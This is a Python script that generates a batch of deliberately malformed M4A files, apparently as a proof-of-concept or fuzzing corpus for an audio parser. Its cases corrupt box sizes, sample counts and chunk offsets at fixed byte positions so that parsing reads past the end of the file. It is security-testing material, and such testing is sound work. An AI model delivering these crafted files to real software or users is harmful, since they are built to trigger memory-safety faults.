import os, struct
OUT='/tmp/m4a_poc/poc2'; os.makedirs(OUT, exist_ok=True)
FRAG='/tmp/m4a_poc/frag.m4a'; BASE='/tmp/m4a_poc/base.m4a'
MOOF=0x2b7; MFHD=0x2bf; TRAF=0x2cf; TFHD=0x2d7; TRUN=0x30f; MDAT=0x42b; MFRA=0xd77b
def u32(b,o): return struct.unpack('>I',b[o:o+4])[0]
def put(b,o,v): b[o:o+4]=struct.pack('>I',v)
def load(p): b=bytearray(open(p,'rb').read()); return b
cases={}
def case(f): cases[f.__name__]=f; return f

@case
def frag_base(b): pass
@case
def moof_size_zero(b): put(b,MOOF,0)
@case
def moof_size_seven(b): put(b,MOOF,7)
@case
def moof_size_ones(b): put(b,MOOF,0xFFFFFFFF)
@case
def moof_type_bad(b): b[MOOF+4:MOOF+8]=b'mOof'
@case
def trun_sample_count_zero(b): put(b,TRUN+12,0)
@case
def trun_sample_count_max(b): put(b,TRUN+12,0xFFFFFFFF)
@case
def trun_data_offset_max(b): put(b,TRUN+16,0xFFFFFFFF)
@case
def trun_data_offset_zero(b): put(b,TRUN+16,0)
@case
def drop_trun(b):
    n=u32(b,TRUN); del b[TRUN:TRUN+n]
    put(b,TRAF,u32(b,TRAF)-n); put(b,MOOF,u32(b,MOOF)-n)
@case
def drop_traf(b):
    n=u32(b,TRAF); del b[TRAF:TRAF+n]
    put(b,MOOF,u32(b,MOOF)-n)
@case
def drop_mfra(b): del b[MFRA:]
@case
def drop_mfhd(b):
    n=u32(b,MFHD); del b[MFHD:MFHD+n]
    put(b,TRAF,u32(b,TRAF)-n); put(b,MOOF,u32(b,MOOF)-n)
@case
def frag_mdat_first(b):
    moof=bytes(b[MOOF:MDAT]); mdat=bytes(b[MDAT:MFRA]); rest=bytes(b[MFRA:])
    b[:] = bytes(b[:MOOF]) + mdat + moof + rest
# lever (a): force the sample walk past EOF — pad mdat, then lie about counts
@case
def stsz_count_max_bigmdat(b):
    b.extend(b'\x00'*(1<<20))
    put(b,0x487, u32(b,0x487)+(1<<20))     # mdat size covers the pad
    put(b,0x245+12, 0xFFFFFFFF)
@case
def stco_offset_past_eof(b):
    b.extend(b'\x00'*(1<<16))
    put(b,0x409+12, u32(b,0x487)+len(b))
@case
def stsz_size_max_bigmdat(b):
    b.extend(b'\x00'*(1<<20))
    put(b,0x487, u32(b,0x487)+(1<<20))
    put(b,0x245+8, 0xFFFFFFFF); put(b,0x245+12, 1)

for n,f in cases.items():
    src = FRAG if not n.startswith(('stsz','stco')) else BASE
    b=load(src); f(b)
    open(os.path.join(OUT,n+'.m4a'),'wb').write(bytes(b))
print(len(cases),'->',OUT)
